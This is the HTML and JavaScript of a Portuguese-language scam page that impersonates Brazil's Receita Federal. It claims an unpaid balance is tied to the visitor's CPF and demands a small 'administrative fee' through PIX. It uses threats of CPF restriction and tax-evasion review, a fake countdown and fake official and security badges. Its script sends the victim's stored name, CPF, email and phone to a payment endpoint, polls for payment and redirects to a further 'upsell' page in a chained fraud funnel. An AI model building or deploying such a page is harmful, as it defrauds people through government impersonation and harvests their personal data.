<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <script src="js/utm-handler.js" data-token="b37547bb-ec0c-41df-a0ba-890b47c59feb">
  </script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="max-image-preview:large">
  <script src="https://cdn.tailwindcss.com"></script>
  <title>Receita Federal - Regularização Digital</title>
  <link
    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Roboto:wght@400;700&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Inter', 'Roboto', sans-serif;
      background: linear-gradient(135deg, #00296b 0%, #01397b 100%);
      color: #ffffff;
      margin: 0;
      padding: 20px;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      line-height: 1.6;
    }

    .container {
      max-width: 600px;
      width: 100%;
      margin: 0 auto;
      background: linear-gradient(135deg, #01397b 0%, #00296b 100%);
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
      border-radius: 16px;
      overflow: hidden;
      border: 2px solid rgba(255, 255, 255, 0.1);
    }

    .header {
      background: linear-gradient(135deg, #00296b 0%, #01397b 100%);
      padding: 25px 30px;
      text-align: center;
      border-bottom: 2px solid rgba(255, 255, 255, 0.1);
    }

    .logo {
      width: 140px;
      margin-bottom: 15px;
      filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.3));
    }

    .protocol-section {
      margin-top: 15px;
      padding-top: 15px;
      border-top: 1px solid rgba(255, 255, 255, 0.1);
    }

    .protocol-label {
      font-size: 0.7rem;
      color: rgba(255, 255, 255, 0.7);
      text-transform: uppercase;
      letter-spacing: 0.5px;
      font-weight: 600;
      margin-bottom: 4px;
    }

    .protocol-number {
      font-size: 0.9rem;
      color: #ffffff;
      font-weight: 700;
      font-family: 'Courier New', monospace;
      letter-spacing: 1px;
    }

    .main-content {
      padding: 35px 30px;
    }

    .alert-badge {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      background: rgba(255, 76, 76, 0.2);
      color: #ff4c4c;
      padding: 8px 16px;
      border-radius: 20px;
      font-size: 0.85rem;
      font-weight: 600;
      margin-bottom: 25px;
      border: 1px solid rgba(255, 76, 76, 0.3);
    }

    .alert-badge i {
      font-size: 1rem;
    }

    h1 {
      color: #ff4c4c;
      font-size: 1.8rem;
      margin-bottom: 20px;
      font-weight: 700;
      text-align: center;
      letter-spacing: 0.5px;
    }

    .content-section {
      background: rgba(255, 255, 255, 0.05);
      border-radius: 12px;
      padding: 25px;
      margin-bottom: 25px;
      border: 1px solid rgba(255, 255, 255, 0.1);
    }

    p {
      font-size: 1rem;
      line-height: 1.7;
      margin-bottom: 15px;
      color: rgba(255, 255, 255, 0.95);
    }

    p:last-child {
      margin-bottom: 0;
    }

    strong {
      color: #ffffff;
      font-weight: 700;
    }

    .valor-container {
      background: rgba(0, 255, 174, 0.1);
      border: 2px solid #00ffae;
      border-radius: 12px;
      padding: 25px;
      margin: 25px 0;
      text-align: center;
    }

    .valor-label {
      font-size: 0.85rem;
      color: rgba(255, 255, 255, 0.8);
      text-transform: uppercase;
      letter-spacing: 0.5px;
      font-weight: 600;
      margin-bottom: 10px;
    }

    .valor {
      font-size: 2.8rem;
      font-weight: 700;
      color: #00ffae;
      margin: 10px 0;
      font-family: 'Inter', sans-serif;
      text-shadow: 0 2px 10px rgba(0, 255, 174, 0.3);
    }

    .consequences-list {
      background: rgba(255, 76, 76, 0.1);
      border-left: 4px solid #ff4c4c;
      border-radius: 8px;
      padding: 20px;
      margin: 25px 0;
      text-align: left;
    }

    .consequences-list ul {
      list-style: none;
      padding: 0;
      margin: 0;
    }

    .consequences-list li {
      font-size: 0.95rem;
      line-height: 1.8;
      margin-bottom: 12px;
      padding-left: 25px;
      position: relative;
      color: rgba(255, 255, 255, 0.95);
    }

    .consequences-list li:last-child {
      margin-bottom: 0;
    }

    .consequences-list li::before {
      content: '\f071';
      font-family: 'Font Awesome 6 Free';
      font-weight: 900;
      position: absolute;
      left: 0;
      color: #ff4c4c;
      font-size: 0.9rem;
    }

    .timer-section {
      background: rgba(255, 204, 0, 0.15);
      border: 2px solid #ffcc00;
      border-radius: 12px;
      padding: 20px;
      margin: 25px 0;
      text-align: center;
    }

    .timer-label {
      font-size: 0.85rem;
      color: rgba(255, 255, 255, 0.9);
      text-transform: uppercase;
      letter-spacing: 0.5px;
      font-weight: 600;
      margin-bottom: 10px;
    }

    .timer {
      font-size: 2.2rem;
      color: #ffcc00;
      font-weight: 700;
      font-family: 'Courier New', monospace;
      letter-spacing: 3px;
      text-shadow: 0 2px 10px rgba(255, 204, 0, 0.3);
    }

    .btn-container {
      text-align: center;
      margin: 30px 0;
    }

    .btn {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      background: linear-gradient(135deg, #00d471 0%, #00b160 100%);
      color: #fff;
      font-size: 1.05rem;
      font-weight: 700;
      padding: 18px 40px;
      border: none;
      border-radius: 12px;
      text-decoration: none;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 8px 24px rgba(0, 212, 113, 0.3);
      text-transform: uppercase;
      letter-spacing: 0.5px;
      width: 100%;
      max-width: 450px;
    }

    .btn:hover {
      background: linear-gradient(135deg, #00b160 0%, #00d471 100%);
      transform: translateY(-2px);
      box-shadow: 0 12px 32px rgba(0, 212, 113, 0.4);
    }

    .btn:active {
      transform: translateY(0);
    }

    .btn i {
      font-size: 1.1rem;
    }

    .alerta {
      margin-top: 25px;
      padding: 15px;
      background: rgba(255, 255, 255, 0.05);
      border-radius: 8px;
      font-size: 0.85rem;
      color: rgba(255, 255, 255, 0.9);
      text-align: center;
      border: 1px solid rgba(255, 255, 255, 0.1);
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .alerta i {
      color: #00ffae;
      font-size: 1rem;
    }

    .footer-security {
      background: rgba(0, 0, 0, 0.2);
      padding: 20px 30px;
      border-top: 1px solid rgba(255, 255, 255, 0.1);
      display: flex;
      justify-content: center;
      gap: 20px;
      flex-wrap: wrap;
    }

    .security-item {
      display: flex;
      align-items: center;
      gap: 6px;
      font-size: 0.75rem;
      color: rgba(255, 255, 255, 0.7);
    }

    .security-item i {
      color: #00ffae;
      font-size: 0.85rem;
    }

    @media (max-width: 600px) {
      .container {
        border-radius: 12px;
      }

      .header {
        padding: 20px;
      }

      .main-content {
        padding: 25px 20px;
      }

      h1 {
        font-size: 1.5rem;
      }

      .valor {
        font-size: 2.2rem;
      }

      .timer {
        font-size: 1.8rem;
      }

      .btn {
        font-size: 0.95rem;
        padding: 16px 30px;
      }

      .consequences-list {
        padding: 15px;
      }

      .consequences-list li {
        font-size: 0.9rem;
        padding-left: 20px;
      }
    }
  </style>
</head>

<body>
  <div id="upsellScreen">
    <div class="container">
      <div class="header">
        <img src="images/logo1.png" alt="Receita Federal" class="logo">
        <div class="protocol-section">
          <div class="protocol-label">Protocolo</div>
          <div class="protocol-number" id="protocolNumber">RF-2024-</div>
        </div>
      </div>

      <div class="main-content">
        <div class="alert-badge">
          <i class="fas fa-exclamation-triangle"></i>
          <span>Comunicação Oficial Urgente</span>
        </div>

        <h1>COMUNICAÇÃO OFICIAL URGENTE</h1>

        <div class="content-section">
          <p>
            Identificamos em nosso sistema um <strong>saldo pendente referente a atividades digitais vinculadas ao seu
              CPF</strong>.
          </p>

          <p>
            Para que o valor seja liberado com segurança e regularidade, é necessário efetuar o <strong>recolhimento da
              taxa administrativa</strong> no valor de:
          </p>
        </div>

        <div class="valor-container">
          <div class="valor-label">Taxa Administrativa</div>
          <div class="valor" id="price"><strong>R$ 32,75</strong></div>
        </div>

        <div class="content-section">
          <p>
            O <strong>não pagamento</strong> dentro do prazo estipulado poderá resultar em:
          </p>
        </div>

        <div class="consequences-list">
          <ul>
            <li><strong>Bloqueio automático</strong> do saldo;</li>
            <li><strong>Restrição temporária</strong> do CPF nos sistemas financeiros;</li>
            <li>Encaminhamento do caso para <strong>análise de sonegação fiscal</strong>.</li>
          </ul>
        </div>

        <div class="content-section">
          <p>
            Para evitar quaisquer transtornos, regularize sua situação o quanto antes.
          </p>
        </div>

        <div class="timer-section">
          <div class="timer-label">Tempo Restante</div>
          <div class="timer" id="countdown">08:59</div>
        </div>

        <div class="btn-container">
          <a class="btn" onclick="event.preventDefault(); initiateCheckout(event);">
            <i class="fas fa-lock"></i>
            <span>Pagar Taxa e Liberar Valor</span>
          </a>
        </div>

        <div class="alerta">
          <i class="fas fa-shield-alt"></i>
          <span>Ambiente 100% seguro e verificado - gov.br/validação</span>
        </div>
      </div>

      <div class="footer-security">
        <div class="security-item">
          <i class="fas fa-shield-alt"></i>
          <span>Transação Segura</span>
        </div>
        <div class="security-item">
          <i class="fas fa-lock"></i>
          <span>Dados Protegidos</span>
        </div>
        <div class="security-item">
          <i class="fas fa-certificate"></i>
          <span>Verificado</span>
        </div>
      </div>
    </div>

    <script>
      // Gera número de protocolo único
      function generateProtocolNumber() {
        const timestamp = Date.now();
        const random = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
        return 'RF-2024-' + timestamp.toString().slice(-8) + random;
      }

      // Atualiza protocolo
      document.getElementById('protocolNumber').textContent = generateProtocolNumber();

      // Contagem regressiva
      let minutes = 8;
      let seconds = 59;
      const countdown = document.getElementById("countdown");

      const interval = setInterval(() => {
        seconds--;
        if (seconds < 0) {
          seconds = 59;
          minutes--;
        }

        if (minutes < 0) {
          clearInterval(interval);
          countdown.innerText = "00:00";
        } else {
          countdown.innerText = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
        }
      }, 1000);
    </script>
  </div> <!-- End upsellScreen -->

  <!-- QR Code / PIX Section -->
  <div id="qrcodeSection" class="hidden" style="padding: 0 16px;">
    <div class="px-6 pt-10 pb-8 flex flex-col items-center border-b border-gray-50 bg-white">
      <img src="../images/receitafederal.png" alt="TikTok Logo" class="h-28 w-28 object-contain mb-6 drop-shadow-sm" />
      <div class="text-center">
        <p class="text-[11px] font-bold text-gray-400 uppercase tracking-[0.2em] mb-1">Valor do Pagamento</p>
        <h2 class="text-5xl font-[900] text-[#161823] tracking-tighter" id="paymentValue">R$ 0,00</h2>
      </div>
    </div>
    <div class="text-center mb-6">
      <h3 class="text-2xl font-black mb-2 text-gray-900">Escaneie o QR Code</h3>
      <p class="text-gray-500 text-sm">Ou copie o código PIX abaixo</p>
    </div>
    <div
      class="bg-gradient-to-br from-gray-50 to-white border-2 border-gray-200 rounded-2xl p-6 mb-6 flex justify-center shadow-inner">
      <img id="qrCodeImage" src="#" alt="QR Code PIX" class="max-w-full rounded-lg" />
    </div>
    <div class="mb-6">
      <label class="block text-sm font-bold text-gray-700 mb-3">Código PIX (Copiar e Colar)</label>
      <div class="flex gap-2">
        <input type="text" id="pixCode" readonly
          class="flex-1 p-4 rounded-xl border-2 border-gray-200 bg-gray-50 text-xs font-mono" style="color: #000;" />
        <button
          class="bg-[#FE2C55] px-6 py-4 rounded-xl text-white font-bold uppercase text-xs shadow-lg hover:opacity-90 transition-all"
          id="copy-pix-button" style="background-color: #003473;">COPIAR</button>
      </div>
    </div>
    <div class="bg-blue-50 border-l-4 border-blue-500 p-4 rounded-r-lg mb-4">
      <p class="text-sm text-gray-700">
        <strong class="text-blue-700">Aguardando pagamento...</strong><br />
        <span class="text-gray-600">O status será atualizado automaticamente.</span>
      </p>
    </div>
    <div id="paymentStatus" class="text-center text-sm font-bold text-gray-600 mb-4">Status: Aguardando pagamento</div>
  </div>

  <!-- Sucesso -->
  <div id="successSection" class="hidden px-6 py-8">
    <div class="text-center">
      <div class="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6">
        <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path>
        </svg>
      </div>
      <h3 class="text-2xl font-black mb-2 text-green-600">Pagamento Confirmado!</h3>
      <p class="text-gray-600 mb-6">Seu saque será liberado em breve.</p>
    </div>
  </div>

  <script>
    const upsellScreen = document.getElementById("upsellScreen");
    const pixQrCodeScreen = document.getElementById("qrcodeSection");
    const pixSuccessScreen = document.getElementById("successSection");
    const qrCodeImage = document.getElementById("qrCodeImage");
    const pixCode = document.getElementById("pixCode");
    const paymentField = document.getElementById("paymentValue");
    const body = document.body;

    const pathParts = window.location.pathname.split('/').filter(Boolean);
    const baseFolder = pathParts[0];

    let currentUpsellVal = 3275;

    const price = document.getElementById("price");
    async function fetchUpsellValue() {
      try {
        const urlParams = new URLSearchParams(window.location.search);
        const uId = urlParams.get("upsell") || "up16";
        const req = await fetch(`/${baseFolder}/get-upsell-value.php?upsell=${uId}`);
        const res = await req.json();
        if (res.success) {
          currentUpsellVal = Math.round(res.value * 100);
          price.textContent = formatPrice(currentUpsellVal / 100);
        }
      } catch (e) {
        console.error("Erro ao buscar valor do upsell", e);
      }
    }

    fetchUpsellValue();

    function formatPrice(value) {
      return `R$ ${parseFloat(value).toFixed(2).replace(".", ",")}`;
    }

    let pollingInterval;
    let pollingAttempts = 0;
    const MAX_POLLING_ATTEMPTS = 60;

    async function initiateCheckout(event) {
      event.preventDefault();
      const clientRawData = localStorage.getItem("clientData");;
      const clientData = clientRawData ? JSON.parse(clientRawData) : null;
      try {
        const name = clientData?.nome ? clientData.nome.trim() : "Cliente Upsell";
        const document = clientData?.document || "";
        const email = clientData?.email || "";
        const phone = clientData?.phone || "";
        const formData = new FormData();
        formData.append("priceInCents", currentUpsellVal);
        formData.append("email", email);
        formData.append("name", name);
        formData.append("document", document);
        formData.append("phone", phone);
        const urlParams = new URLSearchParams(window.location.search);
        const utmData = {
          utm_source: urlParams.get("utm_source") || localStorage.getItem("utm_source") || "",
          utm_medium: urlParams.get("utm_medium") || localStorage.getItem("utm_medium") || "",
          utm_campaign: urlParams.get("utm_campaign") || localStorage.getItem("utm_campaign") || "",
          utm_content: urlParams.get("utm_content") || localStorage.getItem("utm_content") || "",
          utm_term: urlParams.get("utm_term") || localStorage.getItem("utm_term") || "",
          xcod: urlParams.get("xcod") || localStorage.getItem("xcod") || "",
          sck: urlParams.get("sck") || localStorage.getItem("sck") || "",
        };
        Object.entries(utmData).forEach(([key, value]) => { formData.append(key, value); });
        const response = await fetch(`/${baseFolder}/pagamento.php`, { method: "POST", body: formData });
        const responseData = await response.json();
        if (responseData.success) {
          if (upsellScreen) upsellScreen.style.display = "none";
          // Important: Handle body background color for QR code screen within upsell16 structure
          body.style.backgroundColor = "#ffffff";
          body.style.display = "block"; // Reset flex display from original body style
          body.style.background = '#ffffff';

          pixQrCodeScreen.classList.remove("hidden");
          qrCodeImage.src = responseData.qrCodeUrl;
          pixCode.value = responseData.pixCode;
          paymentField.textContent = formatPrice(currentUpsellVal / 100);
          startPaymentPolling(responseData.token);
        } else { console.error("Resposta inesperada do pagamento:", responseData); }
      } catch (error) { console.error("Erro ao gerar PIX:", error); }
    }

    async function startPaymentPolling(transactionToken) {
      if (pollingInterval) clearInterval(pollingInterval);
      pollingAttempts = 0;
      pollingInterval = setInterval(async () => {
        pollingAttempts++;
        if (pollingAttempts > MAX_POLLING_ATTEMPTS) { clearInterval(pollingInterval); return; }
        try {
          const response = await fetch(`/${baseFolder}/verificar.php?id=${transactionToken}`);
          if (!response.ok) return;
          const result = await response.json();
          if (result.data.mangofy_data.data.payment_status === 'approved') {
            clearInterval(pollingInterval);
            pixQrCodeScreen.classList.add("hidden");
            pixSuccessScreen.classList.remove("hidden");
            setTimeout(() => { window.location.href = `/${baseFolder}/upsell17/index.html${window.location.search}`; }, 2000);
          }
        } catch (error) { console.error("Polling error", error); }
      }, 5000);
    }

    const copyPixButton = document.getElementById("copy-pix-button");
    const pixCodeText = document.getElementById("pixCode");

    copyPixButton.addEventListener("click", function () {
      if (pixCodeText.value) {
        navigator.clipboard
          .writeText(pixCodeText.value.trim())
          .then(() => {
            copyPixButton.textContent = "Código PIX copiado!";
            setTimeout(() => {
              copyPixButton.textContent = "COPIAR";
            }, 3000);
          })
          .catch(() => {
            copyPixButton.textContent = "Erro ao copiar.";
          });
      }
    });
  </script>


</body>

</html>